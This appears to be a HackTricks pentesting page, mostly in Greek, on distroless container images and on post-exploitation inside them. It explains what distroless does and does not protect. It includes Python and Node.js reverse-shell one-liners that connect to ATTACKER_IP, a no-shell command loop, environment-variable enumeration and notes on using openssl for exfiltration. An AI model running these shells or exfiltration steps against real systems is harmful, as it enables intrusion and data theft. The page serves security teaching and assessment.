# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Ένα **distroless** container image είναι ένα image που περιλαμβάνει τα **ελάχιστα στοιχεία runtime που απαιτούνται για την εκτέλεση μίας συγκεκριμένης εφαρμογής**, αφαιρώντας σκόπιμα τα συνηθισμένα εργαλεία της διανομής, όπως package managers, shells και μεγάλα σύνολα γενικών userland utilities. Στην πράξη, τα distroless images συχνά περιέχουν μόνο το application binary ή το runtime, τις shared libraries του, bundles πιστοποιητικών και μια πολύ μικρή διάταξη filesystem.

Ο σκοπός δεν είναι ότι το distroless αποτελεί ένα νέο kernel isolation primitive. Το distroless είναι μια **στρατηγική σχεδιασμού image**. Αλλάζει ό,τι είναι διαθέσιμο **μέσα** στο filesystem του container και όχι τον τρόπο με τον οποίο ο kernel απομονώνει το container. Αυτή η διάκριση έχει σημασία, επειδή το distroless ενισχύει την ασφάλεια του περιβάλλοντος κυρίως μειώνοντας όσα μπορεί να χρησιμοποιήσει ένας attacker μετά την απόκτηση code execution. Δεν αντικαθιστά τα namespaces, το seccomp, τα capabilities, το AppArmor, το SELinux ή οποιονδήποτε άλλο μηχανισμό runtime isolation.

## Why Distroless Exists

Τα distroless images χρησιμοποιούνται κυρίως για τη μείωση:

- του μεγέθους του image
- της operational πολυπλοκότητας του image
- του αριθμού των packages και binaries που θα μπορούσαν να περιέχουν vulnerabilities
- του αριθμού των post-exploitation tools που είναι διαθέσιμα από προεπιλογή σε έναν attacker

Γι' αυτό τα distroless images είναι δημοφιλή σε production application deployments. Ένα container που δεν περιέχει shell, package manager και σχεδόν κανένα γενικό tooling είναι συνήθως ευκολότερο να αξιολογηθεί operationally και δυσκολότερο να γίνει αντικείμενο interactive abuse μετά από compromise.

Παραδείγματα γνωστών οικογενειών distroless-style images περιλαμβάνουν:

- τα distroless images της Google
- τα Chainguard hardened/minimal images

## What Distroless Does Not Mean

Ένα distroless container **δεν είναι**:

- αυτόματα rootless
- αυτόματα non-privileged
- αυτόματα read-only
- αυτόματα προστατευμένο από seccomp, AppArmor ή SELinux
- αυτόματα ασφαλές από container escape

Είναι ακόμα δυνατό να εκτελεστεί ένα distroless image με `--privileged`, host namespace sharing, επικίνδυνα bind mounts ή mounted runtime socket. Σε αυτό το σενάριο, το image μπορεί να είναι minimal, αλλά το container εξακολουθεί να είναι καταστροφικά insecure. Το distroless αλλάζει το **userland attack surface**, όχι το **kernel trust boundary**.

## Typical Operational Characteristics

Όταν κάνετε compromise σε ένα distroless container, το πρώτο πράγμα που συνήθως παρατηρείτε είναι ότι οι συνηθισμένες παραδοχές παύουν να ισχύουν. Μπορεί να μην υπάρχει `sh`, `bash`, `ls`, `id`, `cat` και μερικές φορές ούτε καν ένα libc-based περιβάλλον που να συμπεριφέρεται όπως αναμένει το συνηθισμένο tradecraft σας. Αυτό επηρεάζει τόσο το offense όσο και το defense, επειδή η απουσία tooling κάνει το debugging, το incident response και το post-exploitation διαφορετικά.

Τα συνηθέστερα patterns είναι:

- υπάρχει το application runtime, αλλά ελάχιστα άλλα
- τα shell-based payloads αποτυγχάνουν επειδή δεν υπάρχει shell
- τα συνηθισμένα enumeration one-liners αποτυγχάνουν επειδή λείπουν τα helper binaries
- συχνά υπάρχουν επίσης file system protections, όπως read-only rootfs ή `noexec` σε writable tmpfs locations

Αυτός ο συνδυασμός είναι συνήθως ο λόγος για τον οποίο γίνεται λόγος για "weaponizing distroless".

## Distroless And Post-Exploitation

Η κύρια offensive πρόκληση σε ένα distroless περιβάλλον δεν είναι πάντα το αρχικό RCE. Συχνά είναι ό,τι ακολουθεί. Αν το exploited workload παρέχει code execution σε ένα language runtime όπως Python, Node.js, Java ή Go, μπορεί να είστε σε θέση να εκτελέσετε arbitrary logic, αλλά όχι μέσω των συνηθισμένων shell-centric workflows που είναι κοινά σε άλλους Linux targets.

Αυτό σημαίνει ότι το post-exploitation συχνά κατευθύνεται προς μία από τρεις κατευθύνσεις:

1. **Χρησιμοποιήστε απευθείας το υπάρχον language runtime** για να κάνετε enumerate το περιβάλλον, να ανοίξετε sockets, να διαβάσετε files ή να κάνετε stage επιπλέον payloads.
2. **Φέρτε το δικό σας tooling στη μνήμη** αν το filesystem είναι read-only ή οι writable locations είναι mounted με `noexec`.
3. **Κάντε abuse στα υπάρχοντα binaries που υπάρχουν ήδη στο image** αν η εφαρμογή ή τα dependencies της περιλαμβάνουν κάτι απροσδόκητα χρήσιμο.

## Abuse

### Enumerate The Runtime You Already Have

Σε πολλά distroless containers δεν υπάρχει shell, αλλά εξακολουθεί να υπάρχει application runtime. Αν ο στόχος είναι μια Python service, υπάρχει Python. Αν ο στόχος είναι Node.js, υπάρχει Node. Αυτό συχνά παρέχει αρκετή λειτουργικότητα για enumerate files, ανάγνωση environment variables, άνοιγμα reverse shells και staging in-memory execution χωρίς να γίνει ποτέ invoke το `/bin/sh`.

Ένα απλό παράδειγμα με Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ένα απλό παράδειγμα με Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- ανάκτηση environment variables, που συχνά περιλαμβάνουν credentials ή service endpoints
- filesystem enumeration χωρίς `/bin/ls`
- εντοπισμός writable paths και mounted secrets

### Reverse Shell Χωρίς `/bin/sh`

Εάν το image δεν περιέχει `sh` ή `bash`, ένα κλασικό shell-based reverse shell μπορεί να αποτύχει αμέσως. Σε αυτή την περίπτωση, χρησιμοποιήστε το εγκατεστημένο language runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Εάν δεν υπάρχει το `/bin/sh`, αντικαταστήστε την τελική γραμμή με άμεση εκτέλεση εντολών μέσω Python ή με βρόχο Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Again, if `/bin/sh` is absent, use Node's filesystem, process, and networking APIs directly instead of spawning a shell.

### Πλήρες παράδειγμα: No-Shell Python Command Loop

If the image has Python but no shell at all, a simple interactive loop is often enough to keep full post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Αυτό δεν απαιτεί ένα διαδραστικό binary shell. Ο αντίκτυπος είναι ουσιαστικά ίδιος με αυτόν ενός βασικού shell από την οπτική γωνία του attacker: εκτέλεση εντολών, enumeration και staging περαιτέρω payloads μέσω του υπάρχοντος runtime.

### Εκτέλεση εργαλείων στη μνήμη

Τα Distroless images συχνά συνδυάζονται με:

- `readOnlyRootFilesystem: true`
- writable αλλά `noexec` tmpfs, όπως το `/dev/shm`
- απουσία εργαλείων διαχείρισης πακέτων

Αυτός ο συνδυασμός καθιστά αναξιόπιστες τις κλασικές ροές εργασίας «λήψη binary στον δίσκο και εκτέλεσή του». Σε αυτές τις περιπτώσεις, οι τεχνικές εκτέλεσης στη μνήμη γίνονται η κύρια λύση.

Η dedicated σελίδα για αυτό είναι:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Οι πιο σχετικές τεχνικές εκεί είναι:

- `memfd_create` + `execve` μέσω scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Υπάρχοντα Binaries Ήδη Στο Image

Ορισμένα Distroless images εξακολουθούν να περιέχουν operationally απαραίτητα binaries, τα οποία γίνονται χρήσιμα μετά το compromise. Ένα παράδειγμα που παρατηρείται επανειλημμένα είναι το `openssl`, επειδή οι εφαρμογές μερικές φορές το χρειάζονται για εργασίες σχετικές με cryptography ή TLS.

Ένα γρήγορο search pattern είναι:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Αν υπάρχει το `openssl`, μπορεί να χρησιμοποιηθεί για:

- εξερχόμενες συνδέσεις TLS
- exfiltration δεδομένων μέσω επιτρεπόμενου καναλιού egress
- staging δεδομένων payload μέσω encoded/encrypted blobs

Η ακριβής κατάχρηση εξαρτάται από το τι είναι πραγματικά εγκατεστημένο, αλλά η γενική ιδέα είναι ότι το distroless δεν σημαίνει "καθόλου εργαλεία". Σημαίνει "πολύ λιγότερα εργαλεία από μια κανονική distribution image".

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να προσδιοριστεί αν η image είναι πραγματικά distroless στην πράξη και ποια runtime ή helper binaries είναι ακόμη διαθέσιμα για post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Τι είναι ενδιαφέρον εδώ:

- Αν δεν υπάρχει shell αλλά υπάρχει ένα runtime όπως το Python ή το Node, το post-exploitation θα πρέπει να στραφεί σε εκτέλεση μέσω runtime.
- Αν το root filesystem είναι read-only και το `/dev/shm` είναι writable αλλά `noexec`, οι τεχνικές memory execution γίνονται πολύ πιο σχετικές.
- Αν υπάρχουν βοηθητικά binaries όπως τα `openssl`, `busybox` ή `java`, μπορεί να προσφέρουν αρκετή λειτουργικότητα για την αρχικοποίηση περαιτέρω πρόσβασης.

## Προεπιλογές Runtime

| Τύπος Image / πλατφόρμας | Προεπιλεγμένη κατάσταση | Τυπική συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Images τύπου Google distroless | Minimal userland by design | Χωρίς shell, package manager ή dependencies πέρα από εκείνες της εφαρμογής/runtime | προσθήκη debugging layers, sidecar shells, αντιγραφή του busybox ή εργαλείων |
| Minimal images της Chainguard | Minimal userland by design | Μειωμένο package surface, συχνά εστιασμένο σε ένα runtime ή service | χρήση των `:latest-dev` ή debug variants, αντιγραφή εργαλείων κατά το build |
| Kubernetes workloads που χρησιμοποιούν distroless images | Εξαρτάται από το Pod config | Το Distroless επηρεάζει μόνο το userland· το security posture του Pod εξακολουθεί να εξαρτάται από το Pod spec και τα runtime defaults | προσθήκη ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman που εκτελούν distroless images | Εξαρτάται από τα run flags | Minimal filesystem, αλλά η runtime ασφάλεια εξακολουθεί να εξαρτάται από τα flags και τη ρύθμιση του daemon | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Το βασικό σημείο είναι ότι το distroless είναι **ιδιότητα του image**, όχι προστασία του runtime. Η αξία του προέρχεται από τον περιορισμό όσων είναι διαθέσιμα μέσα στο filesystem μετά το compromise.

## Σχετικές σελίδες

Για filesystem και memory-execution bypasses που χρειάζονται συνήθως σε distroless environments:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Για container runtime, socket και mount abuse που εξακολουθούν να εφαρμόζονται σε distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
